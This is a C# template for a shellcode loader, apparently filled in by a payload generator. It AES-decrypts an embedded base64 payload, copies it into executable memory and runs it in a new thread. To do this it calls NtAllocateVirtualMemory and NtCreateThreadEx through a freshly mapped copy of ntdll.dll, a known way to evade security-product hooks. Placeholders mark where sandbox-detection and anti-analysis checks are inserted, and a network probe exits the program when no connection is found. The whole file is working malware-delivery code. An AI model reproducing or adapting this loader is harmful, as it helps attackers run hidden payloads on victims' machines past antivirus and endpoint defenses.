using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace BY
{
    internal class NewntdlHK
    {
        #region func

        private static Object Locate_Image_Export_Directory(IntPtr BaseAddress)
        {
            int IMAGE_DIRECTORY_ENTRY_EXPORT = 0;

            IMAGE_DOS_HEADER IMAGE_DOS_HEADER_instance = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(
                BaseAddress,
                typeof(IMAGE_DOS_HEADER));

            IntPtr IMAGE_NT_HEADERS64_address = BaseAddress + IMAGE_DOS_HEADER_instance.e_lfanew;
            IMAGE_NT_HEADERS64 IMAGE_NT_HEADERS64_instance = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(
                IMAGE_NT_HEADERS64_address,
                typeof(IMAGE_NT_HEADERS64));

            IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY_instance = IMAGE_NT_HEADERS64_instance.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

            IntPtr IMAGE_EXPORT_DIRECTORY_address = (IntPtr)(BaseAddress.ToInt64() + (int)IMAGE_DATA_DIRECTORY_instance.VirtualAddress);
            IMAGE_EXPORT_DIRECTORY IMAGE_EXPORT_DIRECTORY_instance = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(
                IMAGE_EXPORT_DIRECTORY_address,
                typeof(IMAGE_EXPORT_DIRECTORY));

            return IMAGE_EXPORT_DIRECTORY_instance;
        }

        public static IntPtr Export_Function_Address(IntPtr BaseAddress, string FunctionName)
        {
            IMAGE_EXPORT_DIRECTORY IMAGE_EXPORT_DIRECTORY_instance =
                (IMAGE_EXPORT_DIRECTORY)Locate_Image_Export_Directory(BaseAddress);

            IntPtr RVA_AddressOfFunctions = (IntPtr)(BaseAddress.ToInt64() + IMAGE_EXPORT_DIRECTORY_instance.AddressOfFunctions);
            IntPtr RVA_AddressOfNameOrdinals = (IntPtr)(BaseAddress.ToInt64() + IMAGE_EXPORT_DIRECTORY_instance.AddressOfNameOrdinals);
            IntPtr RVA_AddressOfNames = (IntPtr)(BaseAddress.ToInt64() + IMAGE_EXPORT_DIRECTORY_instance.AddressOfNames);

            UInt32 NumberOfNames = IMAGE_EXPORT_DIRECTORY_instance.NumberOfNames;

            for (int iterate_num = 0; iterate_num < NumberOfNames; iterate_num++)
            {
                UInt32 RVA_AddressOfNames_single = (UInt32)Marshal.ReadInt32(RVA_AddressOfNames, 4 * iterate_num);
                string FuncName_temp = Marshal.PtrToStringAnsi((IntPtr)(BaseAddress.ToInt64() + RVA_AddressOfNames_single));

                if (FuncName_temp.ToLower() == FunctionName.ToLower())
                {
                    UInt16 RVA_AddressOfNameOrdinals_single = (UInt16)Marshal.ReadInt16(RVA_AddressOfNameOrdinals, 2 * iterate_num);
                    UInt32 RVA_AddressOfFunctions_single = (UInt32)Marshal.ReadInt32(RVA_AddressOfFunctions, 4 * RVA_AddressOfNameOrdinals_single);
                    IntPtr REAL_Func_Address = (IntPtr)(BaseAddress.ToInt64() + RVA_AddressOfFunctions_single);
                    IntPtr FunctionAddress = REAL_Func_Address;

                    Console.WriteLine(FuncName_temp + " Address : " + REAL_Func_Address);

                    return FunctionAddress;
                }
            }

            return IntPtr.Zero;
        }

        #endregion func

        #region DELEGATE

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint DFNtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref UIntPtr RegionSize,
            ulong AllocationType,
            ulong Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint DFNtCreateThreadEx(
            out IntPtr hThread,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool CreateSuspended,
            uint StackZeroBits,
            uint SizeOfStackCommit,
            uint SizeOfStackReserve,
            IntPtr lpBytesBuffer
            );

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint DFNtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);

        #endregion DELEGATE

        #region STRUCTS

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public char[] e_magic;       // Magic number

            public UInt16 e_cblp;    // Bytes on last page of file
            public UInt16 e_cp;      // Pages in file
            public UInt16 e_crlc;    // Relocations
            public UInt16 e_cparhdr;     // Size of header in paragraphs
            public UInt16 e_minalloc;    // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;    // Maximum extra paragraphs needed
            public UInt16 e_ss;      // Initial (relative) SS value
            public UInt16 e_sp;      // Initial SP value
            public UInt16 e_csum;    // Checksum
            public UInt16 e_ip;      // Initial IP value
            public UInt16 e_cs;      // Initial (relative) CS value
            public UInt16 e_lfarlc;      // File address of relocation table
            public UInt16 e_ovno;    // Overlay number

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1;    // Reserved words

            public UInt16 e_oemid;       // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;     // OEM information; e_oemid specific

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;    // Reserved words

            public Int32 e_lfanew;      // File address of new exe header
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_NT_HEADERS64
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public char[] Signature;

            [FieldOffset(24)]
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            [FieldOffset(112)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_EXPORT_DIRECTORY
        {
            public UInt32 Characteristics;
            public UInt32 TimeDateStamp;
            public UInt16 MajorVersion;
            public UInt16 MinorVersion;
            public UInt32 Name;
            public UInt32 Base;
            public UInt32 NumberOfFunctions;
            public UInt32 NumberOfNames;
            public UInt32 AddressOfFunctions;     // RVA from base of image
            public UInt32 AddressOfNames;     // RVA from base of image
            public UInt32 AddressOfNameOrdinals;  // RVA from base of image
        }

        [Flags]
        public enum EFileAccess : uint
        {
            //
            // Standart Section
            //

            AccessSystemSecurity = 0x1000000,   // AccessSystemAcl access type
            MaximumAllowed = 0x2000000,     // MaximumAllowed access type

            Delete = 0x10000,
            ReadControl = 0x20000,
            WriteDAC = 0x40000,
            WriteOwner = 0x80000,
            Synchronize = 0x100000,

            StandardRightsRequired = 0xF0000,
            StandardRightsRead = ReadControl,
            StandardRightsWrite = ReadControl,
            StandardRightsExecute = ReadControl,
            StandardRightsAll = 0x1F0000,
            SpecificRightsAll = 0xFFFF,

            FILE_READ_DATA = 0x0001,        // file & pipe
            FILE_LIST_DIRECTORY = 0x0001,       // directory
            FILE_WRITE_DATA = 0x0002,       // file & pipe
            FILE_ADD_FILE = 0x0002,         // directory
            FILE_APPEND_DATA = 0x0004,      // file
            FILE_ADD_SUBDIRECTORY = 0x0004,     // directory
            FILE_CREATE_PIPE_INSTANCE = 0x0004, // named pipe
            FILE_READ_EA = 0x0008,          // file & directory
            FILE_WRITE_EA = 0x0010,         // file & directory
            FILE_EXECUTE = 0x0020,          // file
            FILE_TRAVERSE = 0x0020,         // directory
            FILE_DELETE_CHILD = 0x0040,     // directory
            FILE_READ_ATTRIBUTES = 0x0080,      // all
            FILE_WRITE_ATTRIBUTES = 0x0100,     // all

            //
            // Generic Section
            //

            GenericRead = 0x80000000,
            GenericWrite = 0x40000000,
            GenericExecute = 0x20000000,
            GenericAll = 0x10000000,

            SPECIFIC_RIGHTS_ALL = 0x00FFFF,

            FILE_ALL_ACCESS =
            StandardRightsRequired |
            Synchronize |
            0x1FF,

            FILE_GENERIC_READ =
            StandardRightsRead |
            FILE_READ_DATA |
            FILE_READ_ATTRIBUTES |
            FILE_READ_EA |
            Synchronize,

            FILE_GENERIC_WRITE =
            StandardRightsWrite |
            FILE_WRITE_DATA |
            FILE_WRITE_ATTRIBUTES |
            FILE_WRITE_EA |
            FILE_APPEND_DATA |
            Synchronize,

            FILE_GENERIC_EXECUTE =
            StandardRightsExecute |
              FILE_READ_ATTRIBUTES |
              FILE_EXECUTE |
              Synchronize
        }

        [Flags]
        public enum EFileShare : uint
        {
            /// <summary>
            ///
            /// </summary>
            None = 0x00000000,

            /// <summary>
            /// Enables subsequent open operations on an object to request read access.
            /// Otherwise, other processes cannot open the object if they request read access.
            /// If this flag is not specified, but the object has been opened for read access, the function fails.
            /// </summary>
            Read = 0x00000001,

            /// <summary>
            /// Enables subsequent open operations on an object to request write access.
            /// Otherwise, other processes cannot open the object if they request write access.
            /// If this flag is not specified, but the object has been opened for write access, the function fails.
            /// </summary>
            Write = 0x00000002,

            /// <summary>
            /// Enables subsequent open operations on an object to request delete access.
            /// Otherwise, other processes cannot open the object if they request delete access.
            /// If this flag is not specified, but the object has been opened for delete access, the function fails.
            /// </summary>
            Delete = 0x00000004
        }

        public enum EFileMode : uint
        {
            /// <summary>
            /// Creates a new file. The function fails if a specified file exists.
            /// </summary>
            New = 1,

            /// <summary>
            /// Creates a new file, always.
            /// If a file exists, the function overwrites the file, clears the existing attributes, combines the specified file attributes,
            /// and flags with FILE_ATTRIBUTE_ARCHIVE, but does not set the security descriptor that the SECURITY_ATTRIBUTES structure specifies.
            /// </summary>
            CreateAlways = 2,

            /// <summary>
            /// Opens a file. The function fails if the file does not exist.
            /// </summary>
            OpenExisting = 3,

            /// <summary>
            /// Opens a file, always.
            /// If a file does not exist, the function creates a file as if dwCreationDisposition is CREATE_NEW.
            /// </summary>
            OpenAlways = 4,

            /// <summary>
            /// Opens a file and truncates it so that its size is 0 (zero) bytes. The function fails if the file does not exist.
            /// The calling process must open the file with the GENERIC_WRITE access right.
            /// </summary>
            TruncateExisting = 5
        }

        [Flags]
        public enum EFileAttributes : uint
        {
            Readonly = 0x00000001,
            Hidden = 0x00000002,
            System = 0x00000004,
            Directory = 0x00000010,
            Archive = 0x00000020,
            Device = 0x00000040,
            Normal = 0x00000080,
            Temporary = 0x00000100,
            SparseFile = 0x00000200,
            ReparsePoint = 0x00000400,
            Compressed = 0x00000800,
            Offline = 0x00001000,
            NotContentIndexed = 0x00002000,
            Encrypted = 0x00004000,
            Write_Through = 0x80000000,
            Overlapped = 0x40000000,
            NoBuffering = 0x20000000,
            RandomAccess = 0x10000000,
            SequentialScan = 0x08000000,
            DeleteOnClose = 0x04000000,
            BackupSemantics = 0x02000000,
            PosixSemantics = 0x01000000,
            OpenReparsePoint = 0x00200000,
            OpenNoRecall = 0x00100000,
            FirstPipeInstance = 0x00080000
        }

        public enum FileMapProtection : uint
        {
            PageReadonly = 0x02,
            PageReadWrite = 0x04,
            PageWriteCopy = 0x08,
            PageExecuteRead = 0x20,
            PageExecuteReadWrite = 0x40,
            SectionCommit = 0x8000000,
            SectionImage = 0x1000000,
            SectionNoCache = 0x10000000,
            SectionReserve = 0x4000000,
        }

        public enum FileMapAccessType : uint
        {
            Copy = 0x01,
            Write = 0x02,
            Read = 0x04,
            AllAccess = 0x08,
            Execute = 0x20,
        }

        #endregion STRUCTS

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern IntPtr CreateFileA(
            [MarshalAs(UnmanagedType.LPStr)] string filename,
            [MarshalAs(UnmanagedType.U4)] EFileAccess access,
            [MarshalAs(UnmanagedType.U4)] EFileShare share,
            IntPtr securityAttributes,
            [MarshalAs(UnmanagedType.U4)] EFileMode creationDisposition,
            [MarshalAs(UnmanagedType.U4)] EFileAttributes flagsAndAttributes,
            IntPtr templateFile);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr CreateFileMapping(
            IntPtr hFile,
            IntPtr lpFileMappingAttributes,
            FileMapProtection flProtect,
            uint dwMaximumSizeHigh,
            uint dwMaximumSizeLow,
            [MarshalAs(UnmanagedType.LPStr)] string lpName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr MapViewOfFile(
            IntPtr hFileMappingObject,
            FileMapAccessType dwDesiredAccess,
            uint dwFileOffsetHigh,
            uint dwFileOffsetLow,
            uint dwNumberOfBytesToMap);

        public static string CheckNet(string str1, string str2, string domainname = "baidu.com")
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://" + domainname);
            request.Method = "HEAD";
            request.Timeout = 8000;
            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                return str1;
            }
            catch (WebException e)
            {
                try
                {
                    IPAddress[] ipAddresses = Dns.GetHostAddresses(domainname);
                    if (ipAddresses != null)
                    {
                        return str2;
                    }
                }
                catch (ArgumentNullException)
                {
                    Environment.Exit(-1);
                }
            }
            return "";
        }

        public static byte[] Decrypt(string bs, string keys)
        {
            var bytesToBeDecrypted = Convert.FromBase64String(bs);
            byte[] passwordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(keys));
            byte[] decryptedBytes = null;
            byte[] saltBytes = Encoding.UTF8.GetBytes("{{Salt}}");

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }

        private static string GetProcess(string file, string args = "")
        {
            Process process = new Process();
            process.StartInfo.FileName = file;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.Arguments = args;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            process.Close();
            return output;
        }

		    {{CheckCPUlMemoryLang}}
    {{CheckHardDiskSpace}}
    {{CheckMACAddress}}
    {{CheckProcess}}
    {{ChecksleepAcceleration}}
    {{CheckStartTime}}
        private static void Main(string[] args)
        {
		    {{CheckCPUlMemoryLang_RUN}}
    {{CheckHardDiskSpace_RUN}}
    {{CheckMACAddress_RUN}}
    {{CheckProcess_RUN}}
    {{ChecksleepAcceleration_RUN}}
    {{CheckStartTime_RUN}}
	
			  string str1 = "{{context1}}";
            string str2 = "{{context2}}";
            string str = str1 != "" ? (str2 != "" ? CheckNet(str1, str2) : str1) : (str2 != "" ? str2 : "");
            if (str=="")
            {
                Environment.Exit(-1);
            }        
            byte[] buffer = Decrypt(str, "{{keyText}}");
            string filename_path = "c:\\windows\\system32\\ntdll.dll";
            IntPtr CurrentProcess_handle = Process.GetCurrentProcess().Handle;

            IntPtr NtdllFile_handle = CreateFileA(
                filename_path,
                EFileAccess.GenericRead,
                EFileShare.Read,
                IntPtr.Zero,
                EFileMode.OpenExisting,
                0,
                IntPtr.Zero);

            IntPtr NtdllMapping_handle = CreateFileMapping(
                NtdllFile_handle,
                IntPtr.Zero,
                FileMapProtection.PageReadonly | FileMapProtection.SectionImage,
                0,
                0,
                null);

            // IntPtr MapViewOfFile_address = MapViewOfFile(Mapping_handle, FileMapAccessType.Write, 0, 0, (uint)buf1.Length);
            // LPVOID lpNtdllmaping = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, 0, 0, 0);
            IntPtr NtdllMapViewOfFile_address = MapViewOfFile(NtdllMapping_handle, FileMapAccessType.Read, 0, 0, 0);

            IntPtr Func_address = IntPtr.Zero;
            Func_address = Export_Function_Address(NtdllMapViewOfFile_address, "NtAllocateVirtualMemory");
            DFNtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(
                Func_address,
                typeof(DFNtAllocateVirtualMemory)) as DFNtAllocateVirtualMemory;

            IntPtr pMemoryAllocation = IntPtr.Zero;
            IntPtr pZeroBits = IntPtr.Zero;
            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(buffer.Length));

            uint ntstatus = 0;

            ntstatus = NtAllocateVirtualMemory(
                CurrentProcess_handle,
                ref pMemoryAllocation,
                pZeroBits,
                ref pAllocationSize,
                0x1000 | 0x2000,
                0x00000040
            );

            Marshal.Copy(buffer, 0, (IntPtr)(pMemoryAllocation), buffer.Length);

            Func_address = Export_Function_Address(NtdllMapViewOfFile_address, "NtCreateThreadEx");
            DFNtCreateThreadEx NtCreateThreadEx = Marshal.GetDelegateForFunctionPointer(
                Func_address,
                typeof(DFNtCreateThreadEx)) as DFNtCreateThreadEx;

            IntPtr Thread_handle = IntPtr.Zero;
            uint STANDARD_RIGHTS_ALL = 0x001F0000;
            uint SPECIFIC_RIGHTS_ALL = 0x0000FFFF;

            ntstatus = NtCreateThreadEx(
                out Thread_handle,
                STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL,
                IntPtr.Zero,
                CurrentProcess_handle,
                pMemoryAllocation,
                IntPtr.Zero,
                false,
                0,
                0xFFFF,
                0xFFFF,
                IntPtr.Zero
             );

            Func_address = Export_Function_Address(NtdllMapViewOfFile_address, "NtWaitForSingleObject");
            DFNtWaitForSingleObject NtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer(
                Func_address,
                typeof(DFNtWaitForSingleObject)) as DFNtWaitForSingleObject;

            ntstatus = NtWaitForSingleObject(Thread_handle, true, 0);
        }
    }
}